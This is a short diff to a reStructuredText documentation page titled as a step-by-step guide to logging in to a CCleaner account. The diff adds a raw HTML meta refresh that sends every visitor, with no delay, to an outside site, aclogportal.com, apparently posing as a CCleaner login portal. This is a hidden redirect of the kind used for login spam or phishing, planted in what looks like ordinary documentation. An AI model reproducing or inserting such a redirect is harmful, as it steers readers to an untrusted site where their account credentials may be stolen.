@@ -1,11 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/ccleaner-login-account">
+
 How to Login to My CCleaner Account?: A Step-by-Step Guide 🔐
 ============================================
-.
-.
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 .. image:: login.png
    :alt: My Project Logo
